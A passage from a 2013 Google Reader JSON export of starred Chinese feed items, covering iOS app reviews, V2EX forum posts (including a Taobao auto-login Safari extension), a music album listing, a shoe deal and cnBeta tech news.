      "content" : "<div><img src=\"http://a375.phobos.apple.com/us/r1000/099/Purple/v4/c5/54/f8/c554f818-3c35-dc84-0252-226af0a3c7ef/mzl.ayieywwp.175x175-75.jpg\" style=\"float:left\"><p>小朋友们平时只能玩一会会游戏有没有不开心呢？那如果是听音乐的话，可以多听一会哟！不知道是不是每个小朋友都有着闻歌起舞的本领，至少小虎碰到的小朋友都有这样的天赋。软件中都是英文儿童歌曲，不但可以陶冶情操，还能熏陶小朋友们的乐感和英文情节。还是不错的说，大朋友们动起手来吧！</p>\n\n<p>进入软件后，即可看到从A到Z分类的歌曲，点击字母时会有朗读配音，然后就能看到很多该字母歌曲的名字啦。之后，点名字即可看到带有配图和歌词的画面，听到童声童趣的歌曲。想要返回上一级菜单，只需要点下图片即可。软件内歌曲众多，容量也不算小，不过音质嘛就一般性啦。</p>\n</div><p>价格：免费</p><p>下载地址：<a href=\"http://www.iapps.im/itunes/455210642cn\">http://www.iapps.im/itunes/455210642cn</a></p><p>应用截图:</p><img src=\"http://a2.mzstatic.com/us/r1000/076/Purple/v4/c9/70/6a/c9706a12-28cc-5fef-49ce-3a00c0f062cc/mzl.oqdaxahl.480x480-75.jpg\" alt=\"截图\"><img src=\"http://a2.mzstatic.com/us/r1000/106/Purple/v4/78/76/eb/7876eb84-93db-ddbf-3eca-cea6d2627b8d/mzl.viechrpl.480x480-75.jpg\" alt=\"截图\"><img src=\"http://a4.mzstatic.com/us/r1000/118/Purple/v4/1a/51/d7/1a51d754-48cf-7e2b-d7a1-acb3aa4b799d/mzl.jjbadfvy.480x480-75.jpg\" alt=\"截图\"><img src=\"http://a3.mzstatic.com/us/r1000/100/Purple/v4/9b/4b/54/9b4b543d-788c-ab14-ec2f-6a930c51fbc6/mzl.mjqgabyu.480x480-75.jpg\" alt=\"截图\"><img src=\"http://a3.mzstatic.com/us/r1000/095/Purple/v4/a7/28/8d/a7288db7-7144-eb16-ea9b-db48e701f1b8/mzl.bxhgyswv.480x480-75.jpg\" alt=\"截图\">"
    },
    "author" : "Akira.Y.胖虎",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.iapps.im/feed",
      "title" : "爱应用",
      "htmlUrl" : "http://www.iapps.im"
    }
  }, {
    "crawlTimeMsec" : "1371370493872",
    "timestampUsec" : "1371370493872611",
    "id" : "tag:google.com,2005:reader/item/cb962060b8a1b111",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "「再免/实用工具」我的测量数据：My Measures &amp; Dimensions",
    "published" : 1371404280,
    "updated" : 1371404280,
    "alternate" : [ {
      "href" : "http://www.iapps.im/single/5372",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<div><img src=\"http://a1180.phobos.apple.com/us/r1000/099/Purple/v4/d3/8f/dc/d38fdc85-1fd7-bee2-c002-d16392ab90c2/mzl.tqfnbqcp.175x175-75.jpg\" style=\"float:left\"><p><strong>时隔半年再次限免，推荐给新朋友，PS：本应用分普通版和 Pro 版，但都是收费的，普通版今天再次限时免费。本作 Pro 版额外支持中文语言，支持直接计算面积、体积、求和等等，且为通用程序，怎么就不免一次呢。。</strong></p>\n\n<p>MacWorld 5星评价，App Store 员工最爱！My Measures &amp; Dimensions 是一款功能强大的应用程序，用于存储和共享物体尺寸。你只需给你想要存储尺寸的物体拍张照片。 然后添加尺寸：箭头、角度和文字。 这时你的测量数据已经被存储，你可以随时随地查看并共享。</p>\n\n<p>详细介绍可参考读者爱点评，见正文...</p>\n\n</div><p>价格：免费</p><p>下载地址：<a href=\"http://www.iapps.im/itunes/325962257cn\">http://www.iapps.im/itunes/325962257cn</a></p><p>应用截图:</p><img src=\"http://a5.mzstatic.com/us/r1000/115/Purple/v4/d5/bc/1c/d5bc1cf0-bd18-78e7-ae25-6b0ac177202f/mzl.gontgfas.480x480-75.jpg\" alt=\"截图\"><img src=\"http://a2.mzstatic.com/us/r1000/086/Purple/v4/de/a5/54/dea55421-3ce3-9978-8db4-726754506243/mzl.hpnyuuzg.480x480-75.jpg\" alt=\"截图\"><img src=\"http://a3.mzstatic.com/us/r1000/091/Purple/v4/cf/f4/6e/cff46e56-1225-ea9b-d098-454e117e129d/mzl.vgqextkk.480x480-75.jpg\" alt=\"截图\"><img src=\"http://a1.mzstatic.com/us/r1000/086/Purple/v4/f1/2a/08/f12a08a3-f250-7fb9-0b1b-a75e19258baa/mzl.chyvndab.480x480-75.jpg\" alt=\"截图\"><img src=\"http://a4.mzstatic.com/us/r1000/106/Purple/v4/e6/40/08/e64008b1-c318-b6f5-6e26-4349fb5dc1c5/mzl.rqrmfkco.480x480-75.jpg\" alt=\"截图\">"
    },
    "author" : "qiqiji",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.iapps.im/feed",
      "title" : "爱应用",
      "htmlUrl" : "http://www.iapps.im"
    }
  }, {
    "crawlTimeMsec" : "1371370492076",
    "timestampUsec" : "1371370492076693",
    "id" : "tag:google.com,2005:reader/item/a0096a8b5aca12fa",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "[MIT License 开源] TaobaoAutoLogin - 淘宝自动登录 Safari 扩展",
    "published" : 1371351538,
    "updated" : 1371392970,
    "alternate" : [ {
      "href" : "http://www.v2ex.com/t/72530#reply10",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "下载地址: <a href=\"https://github.com/AlexRezit/TaobaoAutoLogin/raw/master/TaobaoAutoLogin.safariextz\">https://github.com/AlexRezit/TaobaoAutoLogin/raw/master/TaobaoAutoLogin.safariextz</a><br><br>ref: <a href=\"http://alexrezit.github.io/TaobaoAutoLogin/\">http://alexrezit.github.io/TaobaoAutoLogin/</a><br><br>解决淘宝无法记住密码自动登录的问题. <br><br>目前只支持单帐号, 在 Preferences 内设置好用户名与密码后可实现零点击自动登录 (如果没被你刷出验证码的话 -_-#).<br><a href=\"http://ww2.sinaimg.cn/large/8ee226a9jw1e5psmazrmxj20lq0ij0us.jpg\">http://ww2.sinaimg.cn/large/8ee226a9jw1e5psmazrmxj20lq0ij0us.jpg</a><br><br>至于密码的安全, 是由系统的 keychain 进行管理的, 和 Safari 自带的保存密码功能是同样的原理, 可以完全放心.<br><br><br><br>顺便调查一下, 有多少人在同时使用多个淘宝帐号? 共有几个帐号? 如果此插件以后更新多帐号功能, 你们希望以怎样的方式实现自动登录呢?"
    },
    "author" : "alexrezit",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.v2ex.com/feed/tab/all.xml",
      "title" : "V2EX - 全部",
      "htmlUrl" : "http://www.v2ex.com/"
    }
  }, {
    "crawlTimeMsec" : "1371342622959",
    "timestampUsec" : "1371342622959355",
    "id" : "tag:google.com,2005:reader/item/a03b0e0a49cf6901",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "泳儿 -《我自在》[MP3]",
    "published" : 1371342007,
    "updated" : 1371342007,
    "alternate" : [ {
      "href" : "http://www.verycd.com/topics/2956102/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<img src=\"http://i-7.vcimg.com/crop/3169e87c1f0b5d6395c72798be1bd58b270007(280x)/thumb.jpg\" alt=\"泳儿 -《我自在》[MP3]\" style=\"float:right;padding:0 0 10px 10px\">\n\t\t\t\t专辑中文名: 我自在<br>歌手: 泳儿<br>音乐风格: 流行<br>资源格式: MP3<br>发行时间: 2013年6月13日<br>地区: 香港<br>语言: 粤语<br>简介: <br>专辑介绍:<br>泳儿上一张专辑接近天空的地方 找来人山人海合作后，无论音乐人及乐迷都一致好评，唱片公司有见及此今张专辑沿用旧有班底希望将化学作用推更高层次。<br>专辑概念方面，人山人海及唱片公司构思将泳儿性感的一面从歌曲中表露出来，所以在歌曲和唱片封套设计方面都由此入手。<br>唱片封套场景设定为泳儿的睡房，一件简单白衣挂帅，再利用梦境为题材，由泳儿睡房到梦中世界游走。<br>为配合主题，泳儿为新歌&lt;通电&gt;拍摄MV献出第一次，水底拍摄并需要做出多个性感动作，今次找来多次为陈奕迅拍摄MV的导演庄世荣操刀。虽然泳儿于较早前考获潜水执照，略懂水性，但要闭气在水底做出高难度动作亦十分具挑战。<br>拍摄当日泳儿在水底足足超过四个小时，而当时气温亦只有十余度，泳儿不但没有喊辛苦，还多次要求导演只要效果完美，不用迁就她，在场工作人员都觉得泳儿表现得十分专业。最后拍摄时间比之前预期多了两个小时完成。<br>至于歌曲选择方面，唱片公司放心交给人山人海决定，首支派台作&lt;通电&gt;，利用人山人海独有风格，将迷离感觉推至高峰．再配合小克歌词，将一个女生深夜时份等待情人电话到精神开始错乱，带起来乱打号码，幻想和谁在通话，极具性感妖魅。<br>专辑曲目: <br>        01. 心呼吸<br>02. 我自在<br>03. 睡前服<br>04. 睡房宣言<br>05. 深白色<br>06. 一半床<br>07. 通电<br>08. 清洁爱<br>09. 晚上我是天蝎座<br>10. 后来        <br><a href=\"http://www.verycd.com/topics/2956102/#theCom\">评论(75) </a>  <a href=\"http://www.verycd.com/topics/2956102/\">收藏(21) </a>  <a href=\"http://www.verycd.com/topics/2956102/\">查看完整资源页</a><br>"
    },
    "author" : "cc1229",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.verycd.com/sto/music/feed",
      "title" : "首页 音乐  VeryCD电驴大全 - 电驴资源订阅",
      "htmlUrl" : "http://www.verycd.com/sto/music/"
    }
  }, {
    "crawlTimeMsec" : "1371342492985",
    "timestampUsec" : "1371342492985247",
    "id" : "tag:google.com,2005:reader/item/55594118234eed22",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "那谁谁？基于 Raspberry Pi 的短信网关我做好了。",
    "published" : 1371194236,
    "updated" : 1371477142,
    "alternate" : [ {
      "href" : "http://www.v2ex.com/t/72358#reply25",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<a href=\"http://wangx.in/sms-gateway-design-based-on-raspberry-pi/\">http://wangx.in/sms-gateway-design-based-on-raspberry-pi/</a><br><br>看到的是这个贴子： <a href=\"http://www.v2ex.com/t/68321\">http://www.v2ex.com/t/68321</a><br>顺便@一下童鞋们：<br>@<a href=\"http://www.v2ex.com/member/sNullp\">sNullp</a> <br>@<a href=\"http://www.v2ex.com/member/chuangbo\">chuangbo</a> <br>@<a href=\"http://www.v2ex.com/member/swulling\">swulling</a> <br>@<a href=\"http://www.v2ex.com/member/mrluanma\">mrluanma</a> <br>@<a href=\"http://www.v2ex.com/member/icedx\">icedx</a> <br>@<a href=\"http://www.v2ex.com/member/cloudbeyond\">cloudbeyond</a> <br>@<a href=\"http://www.v2ex.com/member/Leask\">Leask</a> <br>@<a href=\"http://www.v2ex.com/member/mrluanma\">mrluanma</a>"
    },
    "author" : "sutar",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.v2ex.com/feed/tab/all.xml",
      "title" : "V2EX - 全部",
      "htmlUrl" : "http://www.v2ex.com/"
    }
  }, {
    "crawlTimeMsec" : "1371332993134",
    "timestampUsec" : "1371332993134075",
    "id" : "tag:google.com,2005:reader/item/1d23808b8195dfab",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "「应用说明书」笔记书写：Write for Dropbox－用法指南与技巧详解",
    "published" : 1371345960,
    "updated" : 1371345960,
    "alternate" : [ {
      "href" : "http://www.iapps.im/single/14793",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<div><img src=\"http://a1652.phobos.apple.com/us/r1000/069/Purple/v4/fe/09/12/fe0912e8-46c8-6ed7-daad-6589129d061a/mzl.rbaljvvq.175x175-75.jpg\" style=\"float:left\"><h3>简介与基本功能说明</h3>\n\n<p>应用强大的功能丝毫不虚 iA Writer 或是 Fio Writer 等知名的文本编辑应用，除了包括字体设置、标点符号在内的多种快捷工具，应用也完全支持 Markdown 编辑语言并支持直接预览！虽然应用的名字上有个 Dropbox，但实际上应用还支持 Evernote、Facebook、Twitter 等等众多常见的分享保存途径；实用的设备共享功能，可以将文本传输给同一局域网下的其他设备继续操作，并支持将其他iOS设备用作键盘；除了强大的功能，应用的界面和美工设计也非常出众，下面就一起来详细看看吧！</p>\n\n<p><img src=\"http://www.iapps.im/public/uploadfiles/2013/05/article/f6b821f5115c758251b3a8c3262b2dfd.jpg\" alt=\"\" title=\"\"></p>\n\n</div><p>价格：¥12.00</p><p>下载地址：<a href=\"http://www.iapps.im/itunes/587363157cn\">http://www.iapps.im/itunes/587363157cn</a></p><p>下载地址：<a href=\"https://itunes.apple.com/cn/app/write-for-dropbox-beautiful/id638171770?mt=8&amp;uo=4\">https://itunes.apple.com/cn/app/write-for-dropbox-beautiful/id638171770?mt=8&amp;uo=4</a></p><p>应用截图:</p><img src=\"http://a5.mzstatic.com/us/r1000/111/Purple2/v4/ec/5d/42/ec5d42d7-5d8e-f21a-c353-2628d85b0a71/mzl.mhrmxiog.480x480-75.jpg\" alt=\"截图\"><img src=\"http://a4.mzstatic.com/us/r1000/072/Purple2/v4/4e/f4/ed/4ef4ed42-f73e-4b71-4d0e-5deeda943485/mzl.jxbyckhw.480x480-75.jpg\" alt=\"截图\"><img src=\"http://a3.mzstatic.com/us/r1000/069/Purple2/v4/02/9f/3a/029f3aae-e976-2a82-9c4e-3ec451b1a1dc/mzl.drdqfcni.480x480-75.jpg\" alt=\"截图\"><img src=\"http://a3.mzstatic.com/us/r1000/079/Purple/v4/f0/1b/29/f01b2934-72fb-4824-7178-2d75a8d01650/mzl.oqfdgbnv.480x480-75.jpg\" alt=\"截图\"><img src=\"http://a5.mzstatic.com/us/r1000/097/Purple/v4/c2/d6/f4/c2d6f487-4894-fe97-80ed-60aaf0228366/mzl.tmlvzvil.480x480-75.jpg\" alt=\"截图\">"
    },
    "author" : "silentyt",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.iapps.im/feed",
      "title" : "爱应用",
      "htmlUrl" : "http://www.iapps.im"
    }
  }, {
    "crawlTimeMsec" : "1371332959311",
    "timestampUsec" : "1371332959311397",
    "id" : "tag:google.com,2005:reader/item/9e9ab9e885bac52d",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "New Balance 新百伦 Minimus M3090 男款轻量化跑鞋　$39.99（约￥330）有晒单！",
    "published" : 1371298624,
    "updated" : 1371298624,
    "alternate" : [ {
      "href" : "http://www.smzdm.com/youhui/241825",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>New Balance新百伦M3090男款轻量化跑鞋，属于其Minimus裸跑系列，是一款主打轻量的跑鞋，单鞋<span style=\"color:#bc0202\">重量仅186g</span>。平滑的鞋底舍弃了层层叠叠的缓震科技，但依旧具有不错的缓震性能，原因在于采用了New Balance的创新中底——<span style=\"color:#bc0202\">REVlite</span>，是最新研发的泡沫混合物緩震中底。比传统中底轻30%，却具备同样高效的强劲缓冲性能，把跑步时对膝盖的冲击降至最低，确保步履舒适稳健。</p>\n<p>JOE’S newbalance OUTLET官网目前特价至39.99美元，目前该站有$1运费活动，尺码和宽度较为齐全，使用信用卡通过转运公司来购买折合人民币约330元（未包含关税），具体购买方法可参考此海淘攻略。价格方面，这个价格买到Minimu系列算是比较合理的价格，国内渠道报价一般在510元~700元，淘宝有接近价格，追求价格极限的网友不妨到淘宝看看，不过有买到假货的风险。另有网友“丶跨时代”的晒单可供欣赏一下。</p>\n<p><a href=\"http://www.smzdm.com/youhui/241825\">购买详情链接</a><br><img src=\"http://pn.zdmimg.com/201304/08/2533d897.jpg_n1.jpg\" alt=\"\"></p>\n<p><img src=\"http://pn.zdmimg.com/201304/08/2d1aa3ee.jpg_n1.jpg\" alt=\"\"></p>\n<p><img src=\"http://pn.zdmimg.com/201304/08/2c2c1b92.jpg_n1.jpg\" alt=\"\"></p>\n<p><img src=\"http://ww1.sinaimg.cn/large/8610a412jw1dyhw2zkbl0j.jpg\" alt=\"\"></p>\n<p>New Balance 新百伦 Minimus M3090 男款轻量化跑鞋　$39.99（约￥330）有晒单！，首发于什么值得买。</p><p>本文来自<a href=\"http://www.smzdm.com/youhui/241825\">什么值得买网站（www.smzdm.com）</a>。</p>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feed.smzdm.com/",
      "title" : "什么值得买",
      "htmlUrl" : "http://www.smzdm.com"
    }
  }, {
    "crawlTimeMsec" : "1371332874507",
    "timestampUsec" : "1371332874507208",
    "id" : "tag:google.com,2005:reader/item/34974eb80cfb959d",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh", "Smartisan OS 锤子ROM" ],
    "title" : "106枚锤子ROM原版图标下载（附12张内置壁纸）",
    "published" : 1371304899,
    "updated" : 1371304899,
    "alternate" : [ {
      "href" : "http://www.cnbeta.com/articles/241240.htm",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<b>感谢<a href=\"http://ando.in\">Ando.in安卓网</a>的投递</b><br> 跳票的锤子ROM发布了所谓Pre-Alpha版，让很多看不惯罗永浩作为的人有了更有利的话柄。从已经发布的ROM刷机文件中也不难看出，现在的锤子ROM还只有一个雏形，远远未达到可以称为OS的水准。但是不管怎么说，今天发布的ROM还是提供了一些关于锤子ROM的有效信息，比如3月27日锤子ROM发布会上重点介绍的全新风格图标。<img width=\"1\" height=\"1\" src=\"http://cnbeta.feedsportal.com/c/34306/f/624776/s/2d541208/mf.gif\" border=\"0\"><div><table border=\"0\"><tr><td valign=\"middle\"><a href=\"http://share.feedsportal.com/share/twitter/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F241240.htm&amp;t=106%E6%9E%9A%E9%94%A4%E5%AD%90ROM%E5%8E%9F%E7%89%88%E5%9B%BE%E6%A0%87%E4%B8%8B%E8%BD%BD%EF%BC%88%E9%99%8412%E5%BC%A0%E5%86%85%E7%BD%AE%E5%A3%81%E7%BA%B8%EF%BC%89\"><img src=\"http://res3.feedsportal.com/social/twitter.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/facebook/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F241240.htm&amp;t=106%E6%9E%9A%E9%94%A4%E5%AD%90ROM%E5%8E%9F%E7%89%88%E5%9B%BE%E6%A0%87%E4%B8%8B%E8%BD%BD%EF%BC%88%E9%99%8412%E5%BC%A0%E5%86%85%E7%BD%AE%E5%A3%81%E7%BA%B8%EF%BC%89\"><img src=\"http://res3.feedsportal.com/social/facebook.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/linkedin/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F241240.htm&amp;t=106%E6%9E%9A%E9%94%A4%E5%AD%90ROM%E5%8E%9F%E7%89%88%E5%9B%BE%E6%A0%87%E4%B8%8B%E8%BD%BD%EF%BC%88%E9%99%8412%E5%BC%A0%E5%86%85%E7%BD%AE%E5%A3%81%E7%BA%B8%EF%BC%89\"><img src=\"http://res3.feedsportal.com/social/linkedin.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/gplus/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F241240.htm&amp;t=106%E6%9E%9A%E9%94%A4%E5%AD%90ROM%E5%8E%9F%E7%89%88%E5%9B%BE%E6%A0%87%E4%B8%8B%E8%BD%BD%EF%BC%88%E9%99%8412%E5%BC%A0%E5%86%85%E7%BD%AE%E5%A3%81%E7%BA%B8%EF%BC%89\"><img src=\"http://res3.feedsportal.com/social/googleplus.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/email/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F241240.htm&amp;t=106%E6%9E%9A%E9%94%A4%E5%AD%90ROM%E5%8E%9F%E7%89%88%E5%9B%BE%E6%A0%87%E4%B8%8B%E8%BD%BD%EF%BC%88%E9%99%8412%E5%BC%A0%E5%86%85%E7%BD%AE%E5%A3%81%E7%BA%B8%EF%BC%89\"><img src=\"http://res3.feedsportal.com/social/email.png\" border=\"0\"></a></td><td valign=\"middle\"></td></tr></table></div><br><br><a href=\"http://da.feedsportal.com/r/165666112067/u/31/f/624776/c/34306/s/2d541208/a2.htm\"><img src=\"http://da.feedsportal.com/r/165666112067/u/31/f/624776/c/34306/s/2d541208/a2.img\" border=\"0\"></a><img width=\"1\" height=\"1\" src=\"http://pi.feedsportal.com/r/165666112067/u/31/f/624776/c/34306/s/2d541208/a2t.img\" border=\"0\">"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.cnbeta.com/backend.php",
      "title" : "cnBeta.COM业界资讯",
      "htmlUrl" : "http://www.cnbeta.com"
    }
  }, {
    "crawlTimeMsec" : "1371165464473",
    "timestampUsec" : "1371165464473856",
    "id" : "tag:google.com,2005:reader/item/2f83a21d508dfef6",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "690出全新未拆封日版Kindle Paperwhite一台（上海可面交，外地顺丰到付）",
    "published" : 1371111616,
    "updated" : 1371116076,
    "alternate" : [ {
      "href" : "http://www.v2ex.com/t/72249#reply4",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "可email联系我<br>yuankwok[at]gmail[dot]com"
    },
    "author" : "K",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.v2ex.com/feed/tab/all.xml",
      "title" : "V2EX - 全部",
      "htmlUrl" : "http://www.v2ex.com/"
    }
  }, {
    "crawlTimeMsec" : "1371165423301",
    "timestampUsec" : "1371165423301979",
    "id" : "tag:google.com,2005:reader/item/4d774a5f9e9c8032",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "「2014年上架」育碧摩托竞速新游 - 特技摩托之前线：Trials Frontier",
    "published" : 1371168120,
    "updated" : 1371168120,
    "alternate" : [ {
      "href" : "http://www.iapps.im/single/15107",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<div><p>在近日召开的E3 2013展上，Ubisoft 公布了两款摩托竞速类游戏：Trials Fusion 和 Trials Frontier，两款游戏都将于明年才能和玩家见面，其中 Trials Fusion 将登陆 Xbox One、PS4、Xbox 360 和 PC 平台，而 Trials Frontier 将登陆iOS等移动平台。</p>\n\n<p><img src=\"http://www.iapps.im/public/uploadfiles/2013/06/article/4a027244414ab84b573982b165099b6d.jpg\" alt=\"\" title=\"\"></p>\n\n<p></p></div>"
    },
    "author" : "Vampire",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.iapps.im/feed",
      "title" : "爱应用",
      "htmlUrl" : "http://www.iapps.im"
    }
  }, {
    "crawlTimeMsec" : "1371164162065",
    "timestampUsec" : "1371164162065461",
    "id" : "tag:google.com,2005:reader/item/f36dec1f8d0f50fa",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh", "Google / 谷歌" ],
    "title" : "GReader Archive - Google Reader 阅读历史存档下载工具",
    "published" : 1371126784,
    "updated" : 1371126784,
    "alternate" : [ {
      "href" : "http://www.cnbeta.com/articles/240972.htm",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<b>感谢<a href=\"http://live.aulddays.com/\">Aulddays</a>的投递</b><br> Google Reader 将在<a href=\"http://www.cnbeta.com/articles/229697.htm\"> 7月1日关闭</a>。虽然谷歌官方提供了<a href=\"http://www.google.com/takeout/#custom:reader\">Take out</a>用于导出用户数据，但导出的范围仅限订阅列表、关注列表、加星或分享过的条目之类，而阅读过的大部分内容则很难找回来了。<a href=\"http://live.aulddays.com/tech/13/google-reader-archive-download.htm\">GReader Archive</a> 这个工具可以让大家从 Google Reader 下载到订阅数据源的<strong>所有历史数据</strong>。<img width=\"1\" height=\"1\" src=\"http://cnbeta.feedsportal.com/c/34306/f/624776/s/2d3d735f/mf.gif\" border=\"0\"><div><table border=\"0\"><tr><td valign=\"middle\"><a href=\"http://share.feedsportal.com/share/twitter/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F240972.htm&amp;t=GReader+Archive+-+Google+Reader+%E9%98%85%E8%AF%BB%E5%8E%86%E5%8F%B2%E5%AD%98%E6%A1%A3%E4%B8%8B%E8%BD%BD%E5%B7%A5%E5%85%B7\"><img src=\"http://res3.feedsportal.com/social/twitter.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/facebook/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F240972.htm&amp;t=GReader+Archive+-+Google+Reader+%E9%98%85%E8%AF%BB%E5%8E%86%E5%8F%B2%E5%AD%98%E6%A1%A3%E4%B8%8B%E8%BD%BD%E5%B7%A5%E5%85%B7\"><img src=\"http://res3.feedsportal.com/social/facebook.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/linkedin/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F240972.htm&amp;t=GReader+Archive+-+Google+Reader+%E9%98%85%E8%AF%BB%E5%8E%86%E5%8F%B2%E5%AD%98%E6%A1%A3%E4%B8%8B%E8%BD%BD%E5%B7%A5%E5%85%B7\"><img src=\"http://res3.feedsportal.com/social/linkedin.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/gplus/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F240972.htm&amp;t=GReader+Archive+-+Google+Reader+%E9%98%85%E8%AF%BB%E5%8E%86%E5%8F%B2%E5%AD%98%E6%A1%A3%E4%B8%8B%E8%BD%BD%E5%B7%A5%E5%85%B7\"><img src=\"http://res3.feedsportal.com/social/googleplus.png\" border=\"0\"></a> <a href=\"http://share.feedsportal.com/share/email/?u=http%3A%2F%2Fwww.cnbeta.com%2Farticles%2F240972.htm&amp;t=GReader+Archive+-+Google+Reader+%E9%98%85%E8%AF%BB%E5%8E%86%E5%8F%B2%E5%AD%98%E6%A1%A3%E4%B8%8B%E8%BD%BD%E5%B7%A5%E5%85%B7\"><img src=\"http://res3.feedsportal.com/social/email.png\" border=\"0\"></a></td><td valign=\"middle\"></td></tr></table></div><br><br><a href=\"http://da.feedsportal.com/r/165665042572/u/31/f/624776/c/34306/s/2d3d735f/a2.htm\"><img src=\"http://da.feedsportal.com/r/165665042572/u/31/f/624776/c/34306/s/2d3d735f/a2.img\" border=\"0\"></a><img width=\"1\" height=\"1\" src=\"http://pi.feedsportal.com/r/165665042572/u/31/f/624776/c/34306/s/2d3d735f/a2t.img\" border=\"0\">"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.cnbeta.com/backend.php",
      "title" : "cnBeta.COM业界资讯",
      "htmlUrl" : "http://www.cnbeta.com"
    }
  }, {
    "crawlTimeMsec" : "1370970640349",
    "timestampUsec" : "1370970640349330",
    "id" : "tag:google.com,2005:reader/item/bd5e867aeafffde6",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "「出类拔萃」苹果年度设计大奖名单公布",
    "published" : 1370981940,
    "updated" : 1370981940,
    "alternate" : [ {
      "href" : "http://www.iapps.im/single/15068",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<div><p>苹果在今天凌晨举办 WWDC 大会上公布了年度苹果设计大奖的得主，获奖作品包含 iOS 和 Mac 平台从实用工具到游戏的一系列应用程序。设立苹果设计大奖的目的就是表彰那些在设计、技术、创新取得显著进步的应用。</p>\n\n<p><img src=\"http://www.iapps.im/public/uploadfiles/2013/06/article/61639bf884fb4d19ba6f11b438c4b61b.jpg\" alt=\"\" title=\"\">\n</p></div>"
    },
    "author" : "wesker",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.iapps.im/feed",
      "title" : "爱应用",
      "htmlUrl" : "http://www.iapps.im"
    }
  }, {
    "crawlTimeMsec" : "1370873743094",
    "timestampUsec" : "1370873743094890",
    "id" : "tag:google.com,2005:reader/item/e4409830da8e1e1d",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "「iOS 技巧」不用越狱，隐藏 iOS 系统应用图标",
    "published" : 1370899920,
    "updated" : 1370899920,
    "alternate" : [ {
      "href" : "http://www.iapps.im/single/15048",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
